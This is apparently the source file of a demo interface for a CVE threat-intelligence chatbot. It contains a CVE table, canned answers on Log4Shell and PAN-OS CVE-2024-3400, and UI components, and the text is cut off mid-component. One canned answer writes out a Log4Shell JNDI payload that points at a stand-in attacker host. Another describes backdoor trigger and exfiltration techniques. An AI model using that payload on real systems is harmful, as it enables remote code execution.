// securellm-v2-utils.jsx — CVE data, red-theme renderers, sidebar, CVE panel

const { useState, useEffect } = React;

// ── Colour tokens ─────────────────────────────────────────────────
const C = {
  bg:'#0D0906', bg2:'#140E09', bg3:'#1C1209',
  red:'#CC3010', red2:'#FF4422',
  rg:'rgba(204,48,16,.35)',
  brd:'rgba(204,48,16,.28)', brd2:'rgba(255,68,34,.55)',
  text:'#EDD8C4', muted:'#7A4432', dim:'#3C1A08',
  teal:'#00BBAA', green:'#1DB845',
};

// ── CVE database ──────────────────────────────────────────────────
const CVE_DATABASE = {
  'CVE-2021-44228': {
    id:'CVE-2021-44228', title:'Apache Log4j2 RCE (Log4Shell)',
    severity:'CRITICAL', cvss:10.0, published:'2021-12-10',
    vector:'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    description:'JNDI lookup injection in Log4j2 enables unauthenticated RCE on any application logging user-controlled input.',
    affected:'Apache Log4j2 2.0-beta9 through 2.15.0 (excl. 2.12.2)',
    patch:'Upgrade to Log4j2 2.17.1+ (Java 8) / 2.12.4+ (Java 7)',
    references:[
      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'},
      {label:'Apache Security Advisory',url:'#'},
      {label:'CISA Alert AA21-356A',url:'#'},
    ],
  },
  'CVE-2024-3400': {
    id:'CVE-2024-3400', title:'PAN-OS GlobalProtect OS Command Injection',
    severity:'CRITICAL', cvss:10.0, published:'2024-04-12',
    vector:'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
    description:'OS command injection via GlobalProtect gateway allows unauthenticated root-level RCE. Device telemetry is NOT required — Palo Alto retracted that prerequisite in an updated advisory.',
    affected:'PAN-OS 10.2, 11.0, 11.1 with GlobalProtect gateway or portal enabled',
    patch:'PAN-OS 10.2.9-h1 / 11.0.4-h1 / 11.1.2-h3; apply Threat IDs 95187, 95189, 95191',
    references:[
      {label:'Palo Alto Networks Advisory',url:'#'},
      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2024-3400'},
    ],
  },
  'CVE-2023-44487': {
    id:'CVE-2023-44487', title:'HTTP/2 Rapid Reset Attack',
    severity:'HIGH', cvss:7.5, published:'2023-10-10',
    vector:'AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
    description:'HTTP/2 RST_STREAM cancellation loops enable high-volume DDoS attacks exceeding 398M RPS.',
    affected:'nginx, Apache httpd, IIS, Go net/http, nghttp2, and others',
    patch:'Apply vendor-specific patches; enforce stream limits',
    references:[
      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2023-44487'},
      {label:'Cloudflare Technical Analysis',url:'#'},
    ],
  },
  'CVE-2022-0847': {
    id:'CVE-2022-0847', title:'Linux Kernel "Dirty Pipe" LPE',
    severity:'HIGH', cvss:7.8, published:'2022-03-07',
    vector:'AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
    description:'Uninitialized pipe buffer flags allow local users to overwrite arbitrary read-only files and escalate to root.',
    affected:'Linux kernel 5.8 through 5.16.10 / 5.15.24 / 5.10.101',
    patch:'Linux 5.16.11, 5.15.25, 5.10.102',
    references:[
      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2022-0847'},
      {label:'dirtypipe.cm4all.com',url:'https://dirtypipe.cm4all.com'},
    ],
  },
  'CVE-2021-26855': {
    id:'CVE-2021-26855', title:'Microsoft Exchange ProxyLogon SSRF',
    severity:'CRITICAL', cvss:9.8, published:'2021-03-02',
    vector:'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    description:'Pre-auth SSRF enables bypass of Exchange authentication, forming the first link in the ProxyLogon RCE chain.',
    affected:'Exchange Server 2013 CU23, 2016 CU18/19, 2019 CU7/8',
    patch:'March 2021 Security Update (KB5000871)',
    references:[
      {label:'Microsoft Security Advisory',url:'#'},
      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2021-26855'},
    ],
  },
  'CVE-2023-23397': {
    id:'CVE-2023-23397', title:'Microsoft Outlook Zero-Click NTLM Relay',
    severity:'CRITICAL', cvss:9.8, published:'2023-03-14',
    vector:'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    description:'Zero-click credential theft via malicious calendar invite; Outlook triggers NTLM auth on receipt without user interaction.',
    affected:'Microsoft Outlook 2013 SP1 through 2021 (Windows)',
    patch:'Patch Tuesday March 2023',
    references:[
      {label:'Microsoft Security Advisory',url:'#'},
      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2023-23397'},
    ],
  },
  'CVE-2023-0386': {
    id:'CVE-2023-0386', title:'Linux OverlayFS Privilege Escalation',
    severity:'HIGH', cvss:7.8, published:'2023-04-05',
    vector:'AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
    description:'Improper permission check in OverlayFS allows mapping SUID files from lower layer, enabling local privilege escalation.',
    affected:'Linux kernel 5.11 through 6.2 with user namespaces enabled',
    patch:'Linux 6.2.4+',
    references:[{label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2023-0386'}],
  },
};

// ── Severity config ───────────────────────────────────────────────
const SEVERITY_CONFIG = {
  CRITICAL:{color:'#FF4422',bg:'rgba(255,68,34,.12)',  border:'rgba(255,68,34,.45)' },
  HIGH:    {color:'#FF8C00',bg:'rgba(255,140,0,.12)',   border:'rgba(255,140,0,.4)'  },
  MEDIUM:  {color:'#FFD700',bg:'rgba(255,215,0,.1)',    border:'rgba(255,215,0,.4)'  },
  LOW:     {color:'#4A90D9',bg:'rgba(74,144,217,.12)',  border:'rgba(74,144,217,.4)' },
};

// ── Demo responses ────────────────────────────────────────────────
const DEMO_RESPONSES = {
  log4shell:`## Log4Shell — CVE-2021-44228

**Severity**: [CRITICAL] — CVSS **10.0** (AV:N/AC:L/PR:N/UI:N)

Log4Shell is a critical RCE vulnerability in Apache Log4j2's JNDI lookup feature. Disclosed December 9, 2021, it became the fastest-exploited vulnerability in history, affecting virtually every Java-based enterprise stack.

### Attack Mechanism

Log4j2 evaluates JNDI expressions embedded in log messages. An attacker sends \`\${jndi:ldap://attacker.com/x}\` as any user-controlled input — HTTP headers, usernames, form fields — triggering an outbound LDAP request that executes attacker-controlled Java bytecode.

### Scope of Impact

- **Affected**: Apache Log4j2 2.0-beta9 through 2.15.0
- **Products hit**: VMware vCenter, Cisco, Apple iCloud, Amazon AWS, Microsoft Azure AD, Elasticsearch, Twitter
- CISA added CVE-2021-44228 to KEV catalog December 10, 2021

### Remediation

- Upgrade to Log4j2 **2.17.1+** (Java 8), **2.12.4+** (Java 7), or **2.3.2+** (Java 6)
- Temporary: set \`-Dlog4j2.formatMsgNoLookups=true\` JVM flag
- Network: block outbound LDAP (TCP 389) and RMI (TCP 1099)`,

  pan_os:`## CVE-2024-3400 — PAN-OS GlobalProtect

**Severity**: [CRITICAL] — CVSS **10.0**

Command injection in PAN-OS allows unauthenticated root-level RCE via the GlobalProtect gateway. **Note**: Device telemetry is NOT required for exploitation — Palo Alto retracted that prerequisite in an updated advisory.

### Prerequisite

- GlobalProtect **gateway or portal** is active and configured (any version in the affected range)

### Attack Summary

- **Vector**: Network-accessible, no credentials, no user interaction
- **Impact**: Full device compromise — read configs, deploy implants, lateral movement
- **Exploitation**: Observed by threat actor **UTA0218** since March 2024

### Affected Versions

- PAN-OS 10.2.x → patched in **10.2.9-h1**
- PAN-OS 11.0.x → patched in **11.0.4-h1**
- PAN-OS 11.1.x → patched in **11.1.2-h3**

### Remediation (Updated)

- Apply hotfix patches immediately — this is the only reliable fix
- Enable Threat Prevention with Threat IDs **95187, 95189, 95191** on the GlobalProtect interface
- Use a Threat Prevention subscription with vulnerability protection enabled
- **Do not rely on disabling device telemetry** — Palo Alto confirmed this is insufficient`,

  pan_os_uta0218:`## UTA0218 — CVE-2024-3400 Exploitation Campaign

**Threat Actor**: UTA0218 (suspected nation-state; attributed by Volexity)
**Vulnerability**: CVE-2024-3400 [CRITICAL] CVSS **10.0**
**Active since**: March 26, 2024 — weeks before public disclosure (April 12, 2024)

### Initial Access

UTA0218 exploited CVE-2024-3400 by sending crafted HTTP requests to the GlobalProtect portal, injecting OS commands via shell metacharacters in the session file name parser — no credentials or user interaction required.

### Execution Chain

- Malicious session files created in \`/var/tmp/\` with embedded bash commands
- Triggered via specially crafted \`SESSID\` cookie values
- Commands executed as **root** on the host firewall OS

### UPSTYLE Backdoor

- Installed at: \`/usr/lib/python3.6/site-packages/system.pth\`
- Monitors nginx error log for encoded commands in CSS-style requests
- Commands triggered via \`img[src^=\` patterns in crafted web requests
- Output written to \`bootstrap.min.css\` for silent HTTP exfiltration
- Restores original file after each execution to evade detection

### Post-Exploitation (Observed)

- Active Directory credential harvesting via \`ntdsutil\`
- Exfiltration of VPN configs, device certificates, session tokens
- Internal lateral movement using stolen credentials
- Persistent reverse shells via cron jobs

### Remediation

Apply patches: PAN-OS **10.2.9-h1 / 11.0.4-h1 / 11.1.2-h3**
Enable Threat IDs **95187, 95189, 95191** on the GlobalProtect interface`,

  pan_os_firewall:`## Firewall Rules to Mitigate CVE-2024-3400

**Critical note**: Network controls are secondary. **Apply PAN-OS patches immediately.**

### Primary Mitigation — Palo Alto Threat Prevention

Enable Threat Prevention and block these Threat IDs on the GlobalProtect interface:
- **95187** — CVE-2024-3400 command injection (variant 1)
- **95189** — CVE-2024-3400 command injection (variant 2)
- **95191** — CVE-2024-3400 command injection (variant 3)

### Network-Level Controls

- Restrict GlobalProtect portal/gateway (TCP 443) to known source IP ranges
- Monitor for anomalous \`SESSID\` cookie patterns in web logs
- Alert on unexpected outbound connections from the firewall's own IP

### What NOT to Rely On

- **Disabling device telemetry** — Palo Alto confirmed this is insufficient
- IP allowlisting alone — UTA0218 blended with legitimate traffic`,

  severity:`## CRITICAL vs HIGH — Severity Classification

### CVSS v3.1 Score Thresholds

- [CRITICAL] CVSS **9.0–10.0** → Emergency patch within 24–72 hours
- [HIGH] CVSS **7.0–8.9** → Priority patch within 7 days
- [MEDIUM] CVSS **4.0–6.9** → Standard cycle within 30 days
- [LOW] CVSS **0.1–3.9** → Next scheduled maintenance

### What Makes a Vulnerability CRITICAL?

CRITICAL scores combine **all** of the following factors:
- **Network accessible** (\`AV:N\`) — remotely exploitable without local access
- **No privileges required** (\`PR:N\`) — zero credentials needed
- **No user interaction** (\`UI:N\`) — no victim action required
- **Complete CIA loss** (\`C:H/I:H/A:H\`) — full confidentiality, integrity, availability impact

### HIGH vs CRITICAL in Practice

HIGH vulnerabilities have at least one mitigating factor:
- Local access only (\`AV:L\`) — e.g., CVE-2022-0847 [HIGH] 7.8 (Dirty Pipe, local LPE only)
- Low-privilege account needed (\`PR:L\`)
- Availability-only impact — e.g., CVE-2023-44487 [HIGH] 7.5 (HTTP/2 DDoS, no data leak)`,

  apache:`## Recent Apache Vulnerabilities

### Apache Log4j2
- CVE-2021-44228 [CRITICAL] 10.0 — JNDI RCE "Log4Shell" (2021-12-10)
- CVE-2021-45046 [CRITICAL] 9.0 — Log4Shell bypass in v2.15.0 (2021-12-14)
- CVE-2021-45105 [HIGH] 7.5 — Infinite recursion DoS (2021-12-18)

### Apache HTTP Server
- CVE-2023-25690 [CRITICAL] 9.8 — \`mod_proxy\` HTTP request smuggling
- CVE-2023-44487 [HIGH] 7.5 — HTTP/2 Rapid Reset DDoS
- CVE-2021-41773 [CRITICAL] 9.8 — Path traversal + RCE in httpd 2.4.49

### Apache Commons Text
- CVE-2022-42889 [CRITICAL] 9.8 — "Text4Shell" variable interpolation RCE

### Monitoring Recommendations

- Subscribe to **security@apache.org** mailing list
- Filter NVD CPE feed: \`cpe:2.3:a:apache:*\`
- Review CISA KEV catalog for actively exploited Apache CVEs`,

  generic:`I'm **SecureLLM**, a threat intelligence assistant fine-tuned on **9,992 CVE records** from the NVD corpus with additional context from security advisories, exploit databases, and vendor bulletins.

### Capabilities

- **CVE Analysis** — technical breakdown of any vulnerability ID
- **Severity Assessment** — CVSS scoring methodology and real-world impact
- **Remediation Guidance** — patch recommendations, mitigations, workarounds
- **Threat Landscape** — vulnerability class trends and active exploitation data

Try asking about **CVE-2021-44228**, "latest Apache vulnerabilities", or "compare CRITICAL vs HIGH severity".`,
};

function getDemoResponse(msg) {
  const m=msg.toLowerCase(), lat=16000+Math.random()*18000;
  const panRelated=m.includes('cve-2024-3400')||m.includes('pan-os')||m.includes('globalprotect')||m.includes('palo alto');
  if(m.includes('log4shell')||m.includes('cve-2021-44228'))return{response:DEMO_RESPONSES.log4shell,latency_ms:lat};
  if(panRelated&&(m.includes('uta0218')||m.includes('threat actor')||m.includes('attack chain')||m.includes('how did')||m.includes('exploit')||m.includes('upstyle')||m.includes('campaign')))return{response:DEMO_RESPONSES.pan_os_uta0218,latency_ms:lat};
  if(panRelated&&(m.includes('firewall')||m.includes('rule')||m.includes('mitigat')||m.includes('block')||m.includes('detect')||m.includes('suricata')||m.includes('snort')))return{response:DEMO_RESPONSES.pan_os_firewall,latency_ms:lat};
  if(panRelated)return{response:DEMO_RESPONSES.pan_os,latency_ms:lat};
  if((m.includes('critical')&&m.includes('high'))||m.includes('compare')||m.includes('cvss'))return{response:DEMO_RESPONSES.severity,latency_ms:lat};
  if(m.includes('apache'))return{response:DEMO_RESPONSES.apache,latency_ms:lat};
  return{response:DEMO_RESPONSES.generic,latency_ms:lat};
}
function extractCVEs(t){return[...new Set((t.match(/CVE-\d{4}-\d{4,7}/g)||[]))];}
function formatRelativeTime(d){const df=Date.now()-d.getTime(),m=Math.floor(df/60000),h=Math.floor(df/3600000),dy=Math.floor(df/86400000);if(m<1)return'NOW';if(m<60)return`${m}m`;if(h<24)return`${h}h`;if(dy===1)return'1d';if(dy<7)return`${dy}d`;return d.toLocaleDateString('en-US',{month:'short',day:'numeric'});}
function estimateTokens(t){return Math.floor(t.split(/\s+/).length*1.35);}

// ── SeverityTag (angular) ─────────────────────────────────────────
function SeverityTag({severity,size='sm'}){
  const cfg=SEVERITY_CONFIG[severity]||{color:'#7A4432',bg:'rgba(122,68,50,.12)',border:'rgba(122,68,50,.35)'};
  const isCrit=severity==='CRITICAL';
  const pad={sm:'2px 6px',md:'3px 10px',lg:'4px 12px'}[size]||'2px 6px';
  const fs={sm:'10px',md:'12px',lg:'13px'}[size]||'10px';
  return(
    <span className={isCrit?'sev-crit':''} style={{display:'inline-flex',alignItems:'center',gap:'4px',padding:pad,borderRadius:'2px',fontSize:fs,fontWeight:700,fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.07em',textTransform:'uppercase',color:cfg.color,background:cfg.bg,border:`1px solid ${cfg.border}`,verticalAlign:'middle',whiteSpace:'nowrap'}}>
      {isCrit&&<span style={{opacity:.7}}>!!</span>}{severity}{isCrit&&<span style={{opacity:.7}}>!!</span>}
    </span>
  );
}

// ── Inline renderer (red theme) ───────────────────────────────────
function renderInline(text,kp='ri'){
  if(!text)return null;
  const cveS={background:'rgba(204,48,16,.12)',color:'#FF4422',padding:'1px 7px',borderRadius:'2px',fontFamily:"'JetBrains Mono',monospace",fontSize:'12px',border:'1px solid rgba(204,48,16,.38)',whiteSpace:'nowrap'};
  const codeS={background:'rgba(204,48,16,.08)',color:'#FFA080',padding:'1px 6px',borderRadius:'2px',fontFamily:"'JetBrains Mono',monospace",fontSize:'12px'};
  const rx=/(\*\*[^*]+\*\*|`CVE-\d{4}-\d{4,7}`|CVE-\d{4}-\d{4,7}|`[^`]+`|\[CRITICAL\]|\[HIGH\]|\[MEDIUM\]|\[LOW\])/g;
  return text.split(rx).map((p,i)=>{
    if(!p)return null;
    const k=`${kp}-${i}`;
    if(p.startsWith('**')&&p.endsWith('**'))return<strong key={k} style={{color:'#EDD8C4',fontWeight:700}}>{p.slice(2,-2)}</strong>;
    const cm=p.match(/^`?(CVE-\d{4}-\d{4,7})`?$/);
    if(cm)return<code key={k} style={cveS}>{cm[1]}</code>;
    if(p.startsWith('`')&&p.endsWith('`'))return<code key={k} style={codeS}>{p.slice(1,-1)}</code>;
    if(p==='[CRITICAL]')return<SeverityTag key={k} severity="CRITICAL"/>;
    if(p==='[HIGH]')    return<SeverityTag key={k} severity="HIGH"/>;
    if(p==='[MEDIUM]')  return<SeverityTag key={k} severity="MEDIUM"/>;
    if(p==='[LOW]')     return<SeverityTag key={k} severity="LOW"/>;
    return<span key={k}>{p}</span>;
  });
}

// ── Markdown renderer (red theme) ────────────────────────────────
function renderMarkdown(text){
  if(!text)return null;
  const lines=text.split('\n');const out=[];let list=[];let inCode=false;let codeLines=[];let n=0;
  const key=()=>`md-${n++}`;
  const flush=()=>{
    if(!list.length)return;
    const k=key();
    out.push(<ul key={k} style={{margin:'5px 0',padding:0,listStyle:'none'}}>{list.map((item,i)=>(<li key={i} style={{display:'flex',gap:'8px',padding:'3px 0',alignItems:'flex-start'}}><span style={{color:'#CC3010',fontSize:'11px',marginTop:'3px',flexShrink:0}}>&gt;</span><span style={{color:'#C8A898',lineHeight:1.55,flex:1}}>{renderInline(item,`li-${k}-${i}`)}</span></li>))}</ul>);
    list=[];
  };
  lines.forEach((line,idx)=>{
    if(inCode){if(line.startsWith('```')){out.push(<pre key={key()} style={{background:'rgba(204,48,16,.07)',border:'1px solid rgba(204,48,16,.2)',borderRadius:'2px',padding:'12px 14px',margin:'8px 0',overflowX:'auto',fontSize:'12px',lineHeight:1.6,color:'#FFA080',fontFamily:"'JetBrains Mono',monospace"}}><code>{codeLines.join('\n')}</code></pre>);codeLines=[];inCode=false;}else codeLines.push(line);return;}
    if(line.startsWith('```')){flush();inCode=true;return;}
    if(line.startsWith('### ')){flush();out.push(<p key={key()} style={{color:'#CC3010',fontWeight:700,margin:'13px 0 4px',fontSize:'10px',letterSpacing:'.14em',textTransform:'uppercase',fontFamily:"'JetBrains Mono',monospace"}}>{renderInline(line.slice(4),`h3-${idx}`)}</p>);}
    else if(line.startsWith('## ')){flush();out.push(<p key={key()} style={{color:'#EDD8C4',fontWeight:700,margin:'13px 0 5px',fontSize:'15px'}}>{renderInline(line.slice(3),`h2-${idx}`)}</p>);}
    else if(line.startsWith('# ')){flush();out.push(<p key={key()} style={{color:'#EDD8C4',fontWeight:700,margin:'13px 0 6px',fontSize:'16px'}}>{renderInline(line.slice(2),`h1-${idx}`)}</p>);}
    else if(/^[-*•]\s+/.test(line)){list.push(line.replace(/^[-*•]\s+/,''));}
    else if(line.trim()==='---'){flush();out.push(<hr key={key()} style={{border:'none',borderTop:'1px solid rgba(204,48,16,.15)',margin:'10px 0'}}/>);}
    else if(line.trim()===''){flush();if(out.length)out.push(<div key={key()} style={{height:'6px'}}/>);}
    else{flush();out.push(<p key={key()} style={{margin:'3px 0',lineHeight:1.6,color:'#C8A898',fontFamily:'Inter,sans-serif',fontSize:'14px'}}>{renderInline(line,`p-${idx}`)}</p>);}
  });
  flush();return out;
}

// ── Brackets corner decoration ────────────────────────────────────
function Brackets({children,style,clr='rgba(255,68,34,.4)'}){
  const s={position:'absolute',width:9,height:9,borderColor:clr,borderStyle:'solid'};
  return(
    <div style={{position:'relative',...style}}>
      <div style={{...s,top:-1,left:-1,borderWidth:'1px 0 0 1px'}}/>
      <div style={{...s,top:-1,right:-1,borderWidth:'1px 1px 0 0'}}/>
      <div style={{...s,bottom:-1,left:-1,borderWidth:'0 0 1px 1px'}}/>
      <div style={{...s,bottom:-1,right:-1,borderWidth:'0 1px 1px 0'}}/>
      {children}
    </div>
  );
}

// ── Sidebar ───────────────────────────────────────────────────────
const MOCK_CONVERSATIONS=[
  {id:'c1',title:'Log4Shell Technical Analysis',   preview:'CVE-2021-44228 involves JNDI injection…',ts:new Date(Date.now()-7200000)},
  {id:'c2',title:'CVE-2024-3400 PAN-OS Breakdown', preview:'Affects GlobalProtect with telemetry on…',ts:new Date(Date.now()-86400000)},
  {id:'c3',title:'CRITICAL vs HIGH Severity',      preview:'CVSS 9.0–10.0 is classified as CRITICAL…',ts:new Date(Date.now()-172800000)},
  {id:'c4',title:'Apache Vulnerabilities Q2 2024', preview:'Log4j2, Commons Text, Struts all hit…',  ts:new Date(Date.now()-259200000)},
  {id:'c5',title:'Linux Kernel LPE Techniques',    preview:'Dirty Pipe and OverlayFS both affect…',  ts:new Date(Date.now()-604800000)},
];
const BINARY_BG=Array.from({length:40},()=>Math.floor(Math.random()*256).toString(2).padStart(8,'0'));

function ConvItem({convo,isActive,onClick}){
  const [h,setH]=useState(false);
  return(
    <div onClick={()=>onClick(convo.id)} onMouseEnter={()=>setH(true)} onMouseLeave={()=>setH(false)}
      style={{padding:'8px 10px',cursor:'pointer',marginBottom:'1px',background:isActive?'rgba(204,48,16,.1)':h?'rgba(204,48,16,.05)':'transparent',borderLeft:`2px solid ${isActive?'#FF4422':h?'rgba(204,48,16,.4)':'transparent'}`,transition:'all .13s'}}>
      <div style={{display:'flex',justifyContent:'space-between',gap:'6px',marginBottom:'2px'}}>
        <span style={{fontSize:'11px',fontWeight:600,color:isActive?'#FF4422':h?C.text:'#7A4432',whiteSpace:'nowrap',overflow:'hidden',textOverflow:'ellipsis',flex:1,fontFamily:"'JetBrains Mono',monospace"}}>
          <span style={{color:isActive?'#FF4422':'rgba(204,48,16,.35)',marginRight:'5px'}}>&gt;</span>{convo.title}
        </span>
        <span style={{fontSize:'9px',color:C.dim,flexShrink:0,fontFamily:"'JetBrains Mono',monospace"}}>{formatRelativeTime(convo.ts)}</span>
      </div>
      <p style={{fontSize:'10px',color:C.dim,margin:0,whiteSpace:'nowrap',overflow:'hidden',textOverflow:'ellipsis',fontFamily:"'JetBrains Mono',monospace"}}>{convo.preview}</p>
    </div>
  );
}

function Sidebar({activeConvId,onSelectConv,onNewChat}){
  const [h,setH]=useState(false);
  return(
    <div style={{width:260,flexShrink:0,background:C.bg2,borderRight:`1px solid ${C.brd}`,display:'flex',flexDirection:'column',height:'100%',overflow:'hidden',position:'relative'}}>
      {/* Binary decoration strip */}
      <div style={{position:'absolute',right:0,top:56,bottom:50,width:16,fontSize:'7px',color:'rgba(204,48,16,.1)',fontFamily:"'JetBrains Mono',monospace",lineHeight:1.35,overflow:'hidden',userSelect:'none',pointerEvents:'none'}}>
        {BINARY_BG.map((b,i)=><div key={i}>{b}</div>)}
      </div>
      <div style={{padding:'12px 10px 8px'}}>
        <button onMouseEnter={()=>setH(true)} onMouseLeave={()=>setH(false)} onClick={onNewChat}
          style={{width:'100%',padding:'8px 12px',background:h?'rgba(204,48,16,.16)':'rgba(204,48,16,.07)',border:`1px solid ${h?C.brd2:C.brd}`,borderRadius:'2px',color:'#FF4422',fontSize:'10px',fontWeight:700,cursor:'pointer',display:'flex',alignItems:'center',gap:'7px',fontFamily:"'JetBrains Mono',monospace",transition:'all .14s',textTransform:'uppercase',letterSpacing:'.08em'}}>
          <span style={{fontSize:'16px',lineHeight:1}}>+</span>NEW ANALYSIS
        </button>
      </div>
      <div style={{padding:'4px 14px 5px',display:'flex',alignItems:'center',gap:'8px'}}>
        <span style={{fontSize:'9px',fontWeight:700,color:C.dim,letterSpacing:'.18em',textTransform:'uppercase',fontFamily:"'JetBrains Mono',monospace"}}>SESSIONS</span>
        <div style={{flex:1,height:1,background:C.brd}}/>
      </div>
      <div style={{flex:1,overflowY:'auto',padding:'0 6px'}} className="sb-scroll">
        {MOCK_CONVERSATIONS.map(c=><ConvItem key={c.id} convo={c} isActive={activeConvId===c.id} onClick={onSelectConv}/>)}
      </div>
      <div style={{padding:'10px',borderTop:`1px solid ${C.brd}`}}>
        <Brackets style={{padding:'10px 12px',background:'rgba(204,48,16,.04)'}}>
          <div style={{display:'flex',alignItems:'center',gap:'6px',marginBottom:'6px'}}>
            <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><rect x="1" y="2.5" width="8" height="5.5" rx="1" fill="none" stroke="#CC3010" strokeWidth="1"/><path d="M3 2.5V1.5M7 2.5V1.5" stroke="#CC3010" strokeWidth="1" strokeLinecap="round"/><rect x="2.2" y="4" width="1.6" height="1.6" rx=".3" fill="#CC3010" opacity=".6"/><rect x="6.2" y="4" width="1.6" height="1.6" rx=".3" fill="#CC3010" opacity=".6"/></svg>
            <span style={{fontSize:'11px',fontWeight:700,color:'#FF4422',fontFamily:"'JetBrains Mono',monospace"}}>LLAMA-3.1-8B</span>
          </div>
          <div style={{display:'flex',gap:'4px',flexWrap:'wrap'}}>
            {['LORA','CUDA FP16','9,992 CVEs'].map(t=><span key={t} style={{fontSize:'9px',color:C.muted,background:'rgba(204,48,16,.06)',border:`1px solid ${C.brd}`,padding:'1px 5px',fontFamily:"'JetBrains Mono',monospace"}}>{t}</span>)}
          </div>
        </Brackets>
        {/* Barcode decoration */}
        <div style={{marginTop:'8px',display:'flex',gap:'1px',height:'12px',opacity:.2}}>
          {Array.from({length:42},(_,i)=><div key={i} style={{flex:i%7===0?2:1,background:'#CC3010',height:'100%'}}/>)}
        </div>
        <div style={{fontSize:'8px',color:C.dim,fontFamily:"'JetBrains Mono',monospace",marginTop:'2px',letterSpacing:'.05em'}}>ROOT@SECURELLM:~#</div>
      </div>
    </div>
  );
}

// ── CVE Panel ─────────────────────────────────────────────────────
function CVSSBar({score}){
  const [w,setW]=useState(0);
  useEffect(()=>{const t=setTimeout(()=>setW((score/10)*100),200);return()=>clearTimeout(t);},[score]);
  const color=score>=9?'#FF4422':score>=7?'#FF8C00':score>=4?'#FFD700':'#4A90D9';
  return(
    <div style={{marginBottom:'12px'}}>
      <div style={{display:'flex',justifyContent:'space-between',marginBottom:'5px'}}>
        <span style={{fontSize:'9px',color:C.dim,letterSpacing:'.12em',textTransform:'uppercase',fontWeight:700,fontFamily:"'JetBrains Mono',monospace"}}>CVSS v3.1</span>
        <span style={{fontSize:'18px',fontWeight:800,color,fontFamily:"'JetBrains Mono',monospace",lineHeight:1}}>{score.toFixed(1)}</span>
      </div>
      <div style={{height:5,background:'rgba(255,255,255,.04)',border:`1px solid ${C.brd}`,overflow:'hidden'}}>
        <div style={{height:'100%',width:`${w}%`,background:color,boxShadow:`0 0 10px ${color}70`,transition:'width 1.3s cubic-bezier(0.4,0,0.2,1)'}}/>
      </div>
    </div>
  );
}

function MetaRow({label,value,mono}){
  return(
    <div style={{marginBottom:'10px',paddingBottom:'10px',borderBottom:'1px solid rgba(204,48,16,.1)'}}>
      <div style={{fontSize:'9px',color:C.dim,letterSpacing:'.13em',textTransform:'uppercase',marginBottom:'3px',fontWeight:700,fontFamily:"'JetBrains Mono',monospace"}}>{label}</div>
      <div style={{fontSize:'11px',color:C.muted,lineHeight:1.55,fontFamily:mono?"'JetBrains Mono',monospace":'Inter,sans-serif',wordBreak:'break-word'}}>{value}</div>
    </div>
  );
}

function RefLink({label,url}){
  const [h,setH]=useState(false);
  return(
    <a href={url} target="_blank" rel="noopener noreferrer" onMouseEnter={()=>setH(true)} onMouseLeave={()=>setH(false)}
      style={{display:'flex',alignItems:'center',gap:'7px',padding:'5px 8px',background:h?'rgba(204,48,16,.1)':'rgba(204,48,16,.04)',border:`1px solid ${h?C.brd2:C.brd}`,color:h?'#FF4422':C.muted,fontSize:'11px',textDecoration:'none',transition:'all .13s',marginBottom:'4px',fontFamily:"'JetBrains Mono',monospace",cursor:'pointer'}}>
      <span style={{color:'#CC3010'}}>&gt;</span>
      <span style={{flex:1}}>{label}</span>
      <span style={{opacity:.35,fontSize:'10px'}}>↗</span>
    </a>
  );
}

function CVEPanel({cveData,isCollapsed,onToggle}){
  return(
    <div style={{width:isCollapsed?0:320,flexShrink:0,background:C.bg2,borderLeft:`1px solid ${C.brd}`,display:'flex',flexDirection:'column',height:'100%',overflow:'hidden',transition:'width .28s cubic-bezier(0.4,0,0.2,1)',position:'relative'}}>
      {!isCollapsed&&cveData&&<>
        <div className="cve-trace" style={{'--d':'3.2s','--dl':'0s'}}/>
        <div className="cve-trace" style={{'--d':'3.2s','--dl':'1.6s'}}/>
      </>}
      <div style={{padding:'10px 14px',borderBottom:`1px solid ${C.brd}`,display:'flex',alignItems:'center',justifyContent:'space-between',flexShrink:0,minWidth:295}}>
        <div style={{display:'flex',alignItems:'center',gap:'7px'}}>
          <span style={{color:'#CC3010',fontSize:'10px'}}>▶</span>
          <span style={{fontSize:'10px',fontWeight:700,color:C.muted,letterSpacing:'.13em',textTransform:'uppercase',fontFamily:"'JetBrains Mono',monospace"}}>CVE DETAIL</span>
        </div>
        <button onClick={onToggle}
          style={{background:'none',border:`1px solid ${C.brd}`,cursor:'pointer',padding:'2px 8px',color:C.muted,fontSize:'10px',fontFamily:"'JetBrains Mono',monospace",transition:'all .13s',borderRadius:'2px'}}
          onMouseEnter={e=>{e.currentTarget.style.color='#FF4422';e.currentTarget.style.borderColor=C.brd2;}}
          onMouseLeave={e=>{e.currentTarget.style.color=C.muted;e.currentTarget.style.borderColor=C.brd;}}>
          [×]
        </button>
      </div>
      <div style={{flex:1,overflowY:'auto',padding:'14px',minWidth:295}} className="sb-scroll">
        {!cveData?(
          <div style={{display:'flex',flexDirection:'column',alignItems:'center',justifyContent:'center',height:'100%',textAlign:'center'}}>
            <div style={{fontSize:'10px',color:C.dim,lineHeight:2,fontFamily:"'JetBrains Mono',monospace"}}>
              // CVE METADATA<br/>// POPULATES ON<br/>// ID DETECTION
            </div>
          </div>
        ):(
          <div>
            <Brackets style={{padding:'10px 12px',marginBottom:'14px',background:'rgba(204,48,16,.04)'}}>
              <code style={{fontSize:'10px',color:'#FF4422',fontFamily:"'JetBrains Mono',monospace",display:'block',marginBottom:'7px'}}>{cveData.id}</code>
              <h3 style={{fontSize:'12px',fontWeight:700,color:C.text,margin:0,lineHeight:1.45,fontFamily:'Inter,sans-serif'}}>{cveData.title}</h3>
            </Brackets>
